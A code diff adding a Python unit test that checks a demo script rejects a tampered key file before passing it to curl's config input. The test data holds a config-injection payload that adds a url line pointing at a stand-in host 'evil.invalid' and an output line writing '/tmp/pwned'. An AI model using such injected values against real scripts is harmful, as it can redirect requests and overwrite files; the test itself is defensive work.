@@ -94,6 +94,23 @@ class DemoKeyHandling(unittest.TestCase):
         self.assertEqual(key_file.read_text().strip(), TOKEN)
         self.assertIn("create-key", self.log.read_text())
 
+    def test_a_key_file_with_injected_config_is_rejected_before_curl_sees_it(self) -> None:
+        # A newline, a quote and a directive-looking line would add curl config lines to `curl -K -`.
+        evil = TOKEN + '"\nurl = "http://evil.invalid/"\noutput = "/tmp/pwned"\n'
+        for content in (evil, TOKEN + '"', TOKEN + "\nheader = x", "abb_live_ x", "not-a-key"):
+            with self.subTest(content=content):
+                self.log.write_text("")
+                self.stdin.write_text("")
+                key_file = self.shared / "demo-key"
+                key_file.write_text(content)
+                self.run_demo(key_file, valid=True)  # the stub would accept anything it is sent
+                sent = self.stdin.read_text()
+                self.assertNotIn("evil.invalid", sent)
+                self.assertNotIn("pwned", sent)
+                self.assertNotIn("header = x", sent)
+                self.assertIn("create-key", self.log.read_text())  # rejected and re-minted
+                self.assertEqual(key_file.read_text().strip(), TOKEN)
+
     def test_a_directory_the_script_creates_is_private(self) -> None:
         key_file = self.dir / "fresh" / "demo-key"
         self.run_demo(key_file, valid=False)
